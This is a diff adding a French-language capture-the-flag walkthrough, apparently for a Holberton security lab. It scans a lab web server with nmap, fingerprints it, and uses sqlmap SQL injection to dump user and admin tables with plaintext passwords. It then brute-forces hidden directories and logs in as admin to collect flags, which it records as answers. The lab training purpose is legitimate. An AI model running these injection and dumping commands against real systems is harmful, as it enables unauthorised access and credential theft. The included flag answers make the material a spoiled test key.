@@ -1,0 +1,91 @@
+0-ports.txt
+$ nmap 10.42.238.102
+PORT   STATE SERVICE
+80/tcp open  http
+
+1-webserver.txt
+Navigateur Web 10.42.238.102-> Extension Wappalyzer
+Web servers
+Nginx 1.18.0
+
+100-flag.txt
+Code source de la page Web 10.42.238.102:
+<!-- Dont forget to delete this comment please
+Holberton Sec Lab - 93d2d64a4c3bc4016348dc707685d357 -->
+echo "93d2d64a4c3bc4016348dc707685d357" > 100-flag.txt
+
+2-injectable.txt
+Trouver l'url qui permet de visualiser le résultat d'une requete:
+http://10.42.238.102/product/1
+http://10.42.238.102/product/2
+/product
+
+3-database.txt
+$ sqlmap http://10.42.238.102/product/1 --dbs
+04:39:25] [INFO] fetching database names
+available databases [4]:
+[*] active.hbtn
+[*] information_schema
+[*] mysql
+echo "active.hbtn" > 3-database.txt
+
+4-tables.txt
+$ sqlmap http://10.42.238.102/product/1 -D active.hbtn --tables
+[04:41:31] [INFO] fetching tables for database: 'active.hbtn'
+Database: active.hbtn
+[4 tables]
++----------+
+| Admins   |
+| Orders   |
+| Products |
+| Users    |
++----------+
+echo "4" > 4-tables.txt
+
+101-flag.txt
+$ sqlmap http://10.42.238.102/product/1 -D active.hbtn --dump
+Table: Users
+[3 entries]
++----+--------------------+---------------------+----------+
+| id | email              | password            | username |
++----+--------------------+---------------------+----------+
+| 1  | yosri@active.hbtn  | 123456789@OEOWVWMO  | yosri    |
+| 2  | maroua@active.hbtn | admin123@OEOWVWMO   | maroua   |
+| 3  | abdou@active.hbtn  | abdouabdou@OEOWVWMO | abdou    |
++----+--------------------+---------------------+----------+
+Se connecter http://10.42.238.102/login avec le username de yosri
+Holberton Sec Lab - 42f687427e3fd7bee60fc95ebd5abbde
+echo "42f687427e3fd7bee60fc95ebd5abbde" > 101-flag.txt
+
+5-hidden_dir.txt
+$ gobuster dir -u http://10.42.238.102 -b302 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/contact              (Status: 200) [Size: 55163]
+/products             (Status: 200) [Size: 3606]
+/login                (Status: 200) [Size: 1708]
+/admin                (Status: 200) [Size: 1708]
+Autre solution:
+$ dirb http://10.42.238.102
+---- Scanning URL: http://10.42.238.102/ ----
++ http://10.42.238.102/admin (CODE:200|SIZE:1708)
++ http://10.42.238.102/contact (CODE:200|SIZE:55163)
++ http://10.42.238.102/login (CODE:200|SIZE:1708)
++ http://10.42.238.102/orders (CODE:302|SIZE:199)
++ http://10.42.238.102/products (CODE:200|SIZE:3606)
+echo "/admin" > 5-hidden_dir.txt
+
+102-flag.txt
+sqlmap http://10.42.238.102/product/1 -D active.hbtn --dump
+Database: active.hbtn
+Table: Admins
+[1 entry]
++----+-------------------+--------------------+----------+
+| id | email             | password           | username |
++----+-------------------+--------------------+----------+
+| 1  | admin@active.hbtn | password1@OEOWVWMO | admin    |
++----+-------------------+--------------------+----------+
+Aller sur la page d'admin http://10.42.238.102/admin et se connecter avec le username admin:
+Holberton Sec Lab - 9117a79f2a59178856a0dcc53623e4c0
+echo "9117a79f2a59178856a0dcc53623e4c0" > 102-flag.txt
